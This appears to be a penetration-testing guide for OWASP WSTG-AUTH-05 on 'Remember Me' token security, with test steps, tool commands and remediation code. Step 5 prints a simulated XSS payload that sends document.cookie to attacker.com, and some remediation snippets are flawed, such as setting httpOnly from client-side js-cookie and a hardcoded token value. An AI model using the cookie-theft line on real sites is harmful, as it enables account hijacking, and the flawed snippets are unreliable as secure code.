# Testing for Vulnerable Remember Password

## Overview

Testing for Vulnerable Remember Password (WSTG-AUTH-05) involves verifying that "Remember Me" or "Remember Password" functionalities in web applications, including Single Page Applications (SPAs) and mobile apps, are implemented securely to prevent unauthorized access. According to OWASP, insecure storage of credentials or tokens in cookies, local storage, or predictable formats can allow attackers to hijack accounts if a device is compromised or data is intercepted. This test focuses on checking for plaintext or weakly encrypted credentials, predictable or long-lived tokens, improper server-side validation, exposure to theft via XSS attacks, insufficient security headers, and lack of monitoring.

**Impact**: Vulnerable "Remember Me" implementations can lead to:
- Unauthorized account access if cookies or tokens are stolen.
- Session hijacking via intercepted or predictable tokens.
- Exposure of sensitive credentials in client-side storage.
- Compromise of user accounts on shared or compromised devices.
- Account takeover via phishing or malware leveraging stolen tokens.

This guide provides a practical, hands-on methodology for testing "Remember Me" vulnerabilities, adhering to OWASP’s WSTG-AUTH-05, with detailed tool setups, specific commands, automation scripts, remediation strategies, and ethical considerations for professional penetration testing. 

**Ethical Note**: Obtain explicit permission for testing, as inspecting cookies, tampering with tokens, or simulating attacks may trigger security alerts or violate terms of service.

## Testing Tools

The following tools are recommended for testing "Remember Me" vulnerabilities, with setup and configuration instructions:

- **Browser Developer Tools**: Inspects cookies, local storage, and session storage for sensitive data.
  - Access in Chrome/Firefox: Press `F12` or right-click and select “Inspect”.
  - No setup required.

- **Burp Suite Community Edition**: Intercepts and analyzes "Remember Me" tokens for predictability or validation issues.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: 127.0.0.1:8080 (Firefox recommended).
  - Install Burp Extension “JWT Editor” for JWT analysis if applicable.

- **OWASP ZAP**: Automates security scans for cookies, tokens, and headers.
  - Download from [OWASP ZAP](https://www.zaproxy.org/download/).
  - Configure proxy: 127.0.0.1:8080.
  - Enable “Passive Scan” and “Active Scan” with authentication scripts.

- **Postman**: Tests API endpoints for token validation.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Configure collections for API requests with token tampering.

- **Ent/Dieharder**: Analyzes token entropy and randomness.
  - Install `ent`: `sudo apt-get install ent` (Linux) or `brew install ent` (macOS).
  - Install `dieharder`: `sudo apt-get install dieharder` (Linux).

- **Python with Requests/BeautifulSoup**: Automates token and storage testing.
  - Install: `pip install requests beautifulsoup4`.

## Testing Methodology

This methodology follows OWASP’s black-box approach for WSTG-AUTH-05, enhanced with automation, advanced token analysis, persistence testing, security headers, logging, and red team simulation for SPAs and mobile apps.

### 1. Test Cookies for Plaintext or Weakly Encrypted Credentials with Browser Developer Tools

**Objective**: Ensure "Remember Me" cookies do not store plaintext or weakly encoded credentials.

**Steps**:
1. Access the login page (e.g., `https://example.com/login`), enable "Remember Me," and log in.
2. Open Browser Developer Tools and inspect cookies for plaintext or Base64-encoded credentials:
   ```
   Application tab -> Cookies -> Select https://example.com -> Check for username, password, or Base64 data
   ```
3. Decode any Base64-encoded cookie values to check for credentials:
   ```
   Console tab -> Type atob('encoded_value') -> Check if output contains username or password
   ```
4. Analyze findings; expected secure response is no credentials or strong encryption in cookies.

**Example Secure Response**:
```
Cookie: remember_token=xyz123; HttpOnly; Secure
[No username or password in cookie]
```

**Example Vulnerable Response**:
```
Cookie: credentials=dXNlcm5hbWU6cGFzc3dvcmQ= [Base64: username:password]
```

**Remediation**:
- Avoid storing credentials in cookies (Python/Flask):
  ```python
  @app.post('/login')
  def login():
      response = jsonify({'status': 'success'})
      response.set_cookie('remember_token', generate_secure_token(), httponly=True, secure=True)
      return response
  ```

**Tip**: Save screenshots of Browser Developer Tools cookie and console tabs. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., cookie contents).

### 2. Test Token Predictability, Entropy, and Lifetime with Burp Suite and Ent/Dieharder

**Objective**: Verify that "Remember Me" tokens are unpredictable, cryptographically strong, and have a reasonable expiration.

**Steps**:
1. Configure Burp Suite with browser proxy (127.0.0.1:8080) and add `example.com` to the target scope.
2. Log in with "Remember Me" enabled, capture the cookie (e.g., `remember_token`), and check for predictability:
   ```
   HTTP History -> Select GET /dashboard -> Check Cookie: remember_token for sequential or simple values
   ```
3. Collect multiple tokens by logging in repeatedly and analyze entropy using `ent`:
   ```
   echo "token1\ntoken2\ntoken3" > tokens.txt
   ent tokens.txt
   ```
   Expected entropy: ~7-8 bits/byte for strong tokens.
4. Use `dieharder` for advanced randomness testing:
   ```
   echo "token1token2token3" | dieharder -g 200 -a
   ```
   Expected: No test failures indicating weak randomness.
5. If JWT is used, inspect with Burp’s JWT Editor for weak algorithms (e.g., HS256 with weak keys).
6. Test token lifetime by resending an old token after a week:
   ```
   Repeater -> Use Cookie: remember_token=old_value after 7 days -> Click Send -> Check response
   ```
7. Analyze responses; expected secure response is unique, high-entropy tokens and rejection of expired tokens.

**Example Secure Response**:
```
HTTP/1.1 401 Unauthorized
Content-Type: application/json
{"error": "Expired or invalid token"}
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
Dashboard content
```

**Remediation**:
- Generate secure tokens with expiration (Node.js):
  ```javascript
  const crypto = require('crypto');
  app.post('/login', (req, res) => {
      const token = crypto.randomBytes(32).toString('hex');
      res.cookie('remember_token', token, { maxAge: 604800000, httpOnly: true, secure: true });
      res.json({ status: 'success' });
  });
  ```

**Tip**: Save Burp Suite HTTP History, Repeater responses, and `ent`/`dieharder` outputs as screenshots or logs. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., predictable tokens).

### 3. Test Local Storage for Sensitive Data with Browser Developer Tools and Automation

**Objective**: Ensure "Remember Me" credentials or tokens are not stored in local or session storage, especially in SPAs (React, Angular) or mobile apps.

**Steps**:
1. Log in with "Remember Me" enabled and open Browser Developer Tools.
2. Check local storage for sensitive data:
   ```
   Application tab -> Local Storage -> Select https://example.com -> Check for username, password, or token
   ```
3. Check session storage for similar data:
   ```
   Application tab -> Session Storage -> Select https://example.com -> Check for username, password, or token
   ```
4. Automate storage checks using Python/Requests/BeautifulSoup:
   ```python
   import requests
   from bs4 import BeautifulSoup
   session = requests.Session()
   session.post('https://example.com/login', data={'username': 'user', 'password': 'pass', 'remember': 'on'})
   response = session.get('https://example.com/dashboard')
   soup = BeautifulSoup(response.text, 'html.parser')
   script_tags = soup.find_all('script')
   for script in script_tags:
       if 'localStorage' in script.text or 'sessionStorage' in script.text:
           print('Potential storage vulnerability:', script.text)
   ```
5. For SPAs (e.g., React, Angular) or mobile apps (Flutter), inspect framework-specific storage (e.g., Redux store, AsyncStorage).
6. Analyze findings; expected secure response is no sensitive data in local or session storage.

**Example Secure Response**:
```
[No username, password, or token in Local Storage or Session Storage]
```

**Example Vulnerable Response**:
```
Local Storage: {"username": "user", "token": "xyz123"}
```

**Remediation**:
- Avoid local storage for tokens (React example):
  ```javascript
  import Cookies from 'js-cookie';
  const login = async () => {
      const response = await fetch('/api/login', { method: 'POST', body: JSON.stringify({ username, password }) });
      Cookies.set('remember_token', response.token, { secure: true, httpOnly: true });
  };
  ```

**Tip**: Save screenshots of Browser Developer Tools storage tabs and Python script outputs. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., storage contents).

### 4. Test Server-Side Validation of Remember Me Tokens with Burp Suite and Postman

**Objective**: Ensure the server rejects invalid or tampered "Remember Me" tokens.

**Steps**:
1. Log in with "Remember Me" enabled and capture a request with the token (e.g., `Cookie: remember_token=xyz123`) in Burp Suite:
   ```
   HTTP History -> Select GET /dashboard with Cookie: remember_token=xyz123 -> Send to Repeater
   ```
2. Tamper with the token (e.g., change to `remember_token=abc123`) and resend:
   ```
   Repeater -> Change remember_token=xyz123 to remember_token=abc123 -> Click Send -> Check response
   ```
3. Automate token tampering tests using Postman:
   ```javascript
   pm.test("Invalid token rejection", async () => {
       const response = await pm.sendRequest({
           url: 'https://example.com/dashboard',
           method: 'GET',
           header: { 'Cookie': 'remember_token=abc123' }
       });
       pm.expect(response.status).to.equal(401);
       pm.expect(response.json().error).to.equal('Invalid remember token');
   });
   ```
4. Analyze responses; expected secure response is rejection of the tampered token.

**Example Secure Response**:
```
HTTP/1.1 401 Unauthorized
Content-Type: application/json
{"error": "Invalid remember token"}
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
Dashboard content
```

**Remediation**:
- Validate tokens server-side (Node.js):
  ```javascript
  app.get('/dashboard', (req, res) => {
      const token = req.cookies.remember_token;
      if (!token || !validateToken(token)) {
          return res.status(401).json({ error: 'Invalid remember token' });
      }
      res.send('Dashboard content');
  });
  ```

**Tip**: Save Burp Suite Repeater responses and Postman test results as screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 5. Test Remember Me Token Theft via XSS with Browser Developer Tools and Red Team Simulation

**Objective**: Ensure "Remember Me" tokens are protected against theft via XSS or phishing.

**Steps**:
1. Log in with "Remember Me" enabled and open Browser Developer Tools.
2. Inspect the "Remember Me" cookie for `HttpOnly` and `Secure` attributes:
   ```
   Application tab -> Cookies -> Select https://example.com -> Verify remember_token has HttpOnly and Secure
   ```
3. Check local storage to ensure tokens are not exposed to JavaScript:
   ```
   Application tab -> Local Storage -> Check for remember_token presence
   ```
4. Simulate XSS-based token theft (with permission):
   ```
   Console tab -> Type: alert(document.cookie) -> Check if remember_token is accessible
   ```
5. Simulate phishing/malware token theft by crafting a malicious script (ethical testing only):
   ```javascript
   // Simulated malicious script
   fetch('https://attacker.com/steal?token=' + document.cookie);
   ```
6. Analyze findings; expected secure response is `HttpOnly` and `Secure` attributes with no token in local storage.

**Example Secure Response**:
```
Cookie: remember_token=xyz123; HttpOnly; Secure
[No remember_token in Local Storage]
```

**Example Vulnerable Response**:
```
Cookie: remember_token=xyz123
Local Storage: {"remember_token": "xyz123"}
```

**Remediation**:
- Set secure cookie attributes (Python/Flask):
  ```python
  @app.post('/login')
  def login():
      response = jsonify({'status': 'success'})
      response.set_cookie('remember_token', 'xyz123', httponly=True, secure=True, max_age=604800)
      return response
  ```

**Tip**: Save screenshots of Browser Developer Tools cookie/storage tabs and XSS simulation results. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., missing attributes).

### 6. Test Browser and Device Persistence with Cross-Browser and Mobile Testing

**Objective**: Verify "Remember Me" token persistence across browser restarts, incognito modes, and mobile devices.

**Steps**:
1. Log in with "Remember Me" enabled on Chrome, Firefox, and a mobile browser (e.g., Safari iOS, Chrome Android).
2. Close and reopen the browser, checking if the session persists:
   ```
   Application tab -> Cookies -> Verify remember_token presence after restart
   ```
3. Test in incognito/private mode to ensure tokens are not reused:
   ```
   Open incognito window -> Access https://example.com/dashboard -> Verify login required
   ```
4. On mobile apps (e.g., Flutter), inspect token storage (AsyncStorage) using debugging tools like Flipper.
5. Analyze findings; expected secure response is limited persistence and no reuse in incognito mode.

**Example Secure Response**:
```
[Login required after browser restart or in incognito mode]
```

**Example Vulnerable Response**:
```
[Session persists in incognito mode with same remember_token]
```

**Remediation**:
- Limit token persistence (Flutter example):
  ```dart
  import 'package:shared_preferences/shared_preferences.dart';
  Future<void> login() async {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('remember_token', 'xyz123'); // Avoid long-term persistence
  }
  ```

**Tip**: Save screenshots of cookie persistence across browsers/devices. Organize findings in a report with timestamps and test descriptions.

### 7. Test Security Headers and CSP with OWASP ZAP

**Objective**: Ensure proper security headers and Content Security Policy (CSP) protect "Remember Me" tokens.

**Steps**:
1. Configure OWASP ZAP with proxy (127.0.0.1:8080) and add `example.com` to the scope.
2. Perform a passive scan to check headers:
   ```
   Tools -> Passive Scan -> Check for X-Content-Type-Options, X-Frame-Options, Referrer-Policy, CSP
   ```
3. Verify CSP restricts script execution to prevent XSS:
   ```
   HTTP History -> Select GET /dashboard -> Check Content-Security-Policy header
   ```
4. Analyze findings; expected secure response includes `nosniff`, `DENY`, and strict CSP.

**Example Secure Response**:
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Example Vulnerable Response**:
```
[Missing X-Content-Type-Options, X-Frame-Options, or weak CSP]
```

**Remediation**:
- Add security headers (Node.js/Express):
  ```javascript
  const helmet = require('helmet');
  app.use(helmet({
      contentSecurityPolicy: {
          directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] }
      }
  }));
  ```

**Tip**: Save OWASP ZAP scan reports. Organize findings in a report with timestamps and evidence of missing headers.

### 8. Test Logging and Monitoring for Token Reuse with Log Analysis

**Objective**: Ensure token reuse or tampering triggers logging and alerts.

**Steps**:
1. Attempt token tampering using Burp Suite Repeater (as in Step 4).
2. Request server logs (with permission) or simulate logging:
   ```
   tail -f /var/log/nginx/access.log | grep "remember_token"
   ```
3. Check for alerts in SIEM tools (e.g., Splunk, ELK) for token misuse.
4. Analyze findings; expected secure response includes logged invalid token attempts.

**Example Secure Response**:
```
[Log entry]: "Invalid remember_token attempt: abc123 from IP 192.168.1.1"
```

**Example Vulnerable Response**:
```
[No log entries for invalid token attempts]
```

**Remediation**:
- Implement logging (Python/Flask):
  ```python
  import logging
  logging.basicConfig(filename='app.log', level=logging.WARNING)
  @app.get('/dashboard')
  def dashboard():
      token = request.cookies.get('remember_token')
      if not validate_token(token):
          logging.warning(f"Invalid remember_token attempt: {token} from {request.remote_addr}")
          return jsonify({'error': 'Invalid token'}), 401
      return 'Dashboard content'
  ```

**Tip**: Save log excerpts or SIEM alert screenshots. Organize findings in a report with timestamps and evidence.

### 9. Automate Testing for CI/CD Integration

**Objective**: Automate "Remember Me" vulnerability tests for CI/CD pipelines.

**Steps**:
1. Create a Python script to automate cookie, storage, and token tests:
   ```python
   import requests
   from bs4 import BeautifulSoup
   import base64
   session = requests.Session()
   response = session.post('https://example.com/login', data={'username': 'user', 'password': 'pass', 'remember': 'on'})
   cookies = session.cookies.get_dict()
   for name, value in cookies.items():
       try:
           decoded = base64.b64decode(value).decode()
           print(f"Vulnerable cookie found: {name}={decoded}")
       except:
           pass
   response = session.get('https://example.com/dashboard')
   soup = BeautifulSoup(response.text, 'html.parser')
   if 'localStorage' in response.text or 'sessionStorage' in response.text:
       print("Potential storage vulnerability detected")
   ```
2. Integrate into CI/CD (e.g., GitLab CI):
   ```yaml
   stages:
     - test
   security_test:
     stage: test
     script:
       - pip install requests beautifulsoup4
       - python security_test.py
     artifacts:
       paths:
         - test_report.txt
   ```
3. Run OWASP ZAP in CI/CD for header and token scans:
   ```bash
   docker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com
   ```

**Remediation**:
- Ensure CI/CD pipelines fail on security vulnerabilities to enforce fixes.

**Tip**: Save CI/CD pipeline logs and test outputs. Include in a report with timestamps and evidence.
